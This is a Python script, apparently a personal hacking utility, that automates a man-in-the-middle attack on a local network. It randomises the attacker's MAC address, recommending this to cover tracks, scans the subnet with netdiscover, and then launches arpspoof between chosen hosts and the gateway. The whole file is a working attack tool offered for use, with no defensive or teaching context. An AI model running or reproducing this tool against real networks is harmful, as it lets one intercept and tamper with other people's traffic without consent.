#! /usr/bin/python3

import subprocess
import shlex
from pathlib import Path

def run_command(command):
    listoutput = []
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    while True:
        output = str(process.stdout.readline().strip()).split("'")[1]
        if output == '' and process.poll() is not None:
            break
        if output:
            listoutput.append(output.strip())
    return listoutput

def run_command2(command):
    subprocess.run(command, stdout=subprocess.PIPE, shell=True)

def ip_input(value):
    resultlist = []
    if '-' in value:
        first = int(value.split('-')[0].strip())
        second = int(value.split('-')[1].strip())
        for var in range(first, second+1):
            resultlist.append(var)
    elif ',' in value:
        print('multi numbers')
        for var in value.split(','):
            number = int(var.strip())
            resultlist.append(number)
    else:
         resultlist.append(int(value))
    return resultlist

def choose_step():
    print(' ')
    checkmac = 'unchange'
    if (currmac != permmac):
        checkmac = 'changed'
    print('Your IP: {}, Interface: {}'.format(yourIP, interface))
    print('Gateway: {}, Current MAC: {} {}'.format(gateway, currmac, checkmac))
    print('********************************************')
    print('1. Change my MAC address (Recommendation!)')
    print('2. Scan my network')
    print('3. Arp Spoof ip address')
    print('0. Exit')
    print('********************************************')
    var = int(input())
    return var

iproute = run_command('ip route')
gateway = iproute[0].split(" ")[2]
interface = iproute[0].split(" ")[4]
rangeIP = iproute[1].split(" ")[0]
yourIP = iproute[1].split(" ")[8]
macchanger = run_command('macchanger -s ' + interface)
currmac = macchanger[0].split(" ")[4]
permmac = macchanger[1].split(" ")[2]

print(' ')
print('********************************************')
print('**************Minh*Nguyen*******************')
print('********************************************')
print('Welcome to Arp Spoof script! Please select: ')

while True:
    step = choose_step()

    if step == 1: # 1. Change my MAC address
        result = run_command('macchanger -r ' + interface)
        currmac = result[2].split(" ")[8]

    elif step == 2: # 2. Scan my network
        run_command2('gnome-terminal -- /bin/bash -c \'netdiscover -r ' + rangeIP + ' | tee netdiscover.txt\'')
        

    elif step == 3: # 3. Arp Spoof ip address
        
        netdctxt = Path('netdiscover.txt')
        if not netdctxt.is_file():
            print('Please run Step 2.')
            continue

        iptxt = Path('ipaddress.txt')
        if not iptxt.is_file():
            run_command2('grep -oE \"\\b([0-9]{1,3}\.){3}[1-9]{1}[0-9]{0,2}\\b\" netdiscover.txt | sort -u > ipaddress.txt')

        iplist = []
        with open('ipaddress.txt', 'r') as fin:
            i = 1
            for line in fin:
                line = line.strip()
                if gateway != line:
                    print(i, 'Ip:', line)
                    i = i+1;
                    iplist.append(line)
            
        var = str(input("Please select one IP address ([0] to quit): "))

        resultlist = ip_input(var)
        if resultlist[0] == 0:
            continue

        for ipnum in resultlist:
            run_command2('gnome-terminal -- arpspoof -i ' + interface + ' -t ' + iplist[ipnum-1] + ' -r ' + gateway)

    else: # 0. Remove residual files and Exit
        netdctxt = Path('netdiscover.txt')
        if netdctxt.is_file():
            netdctxt.unlink()

        iptxt = Path('ipaddress.txt')
        if iptxt.is_file():
            iptxt.unlink()

        print('Bye!!!')
        exit()


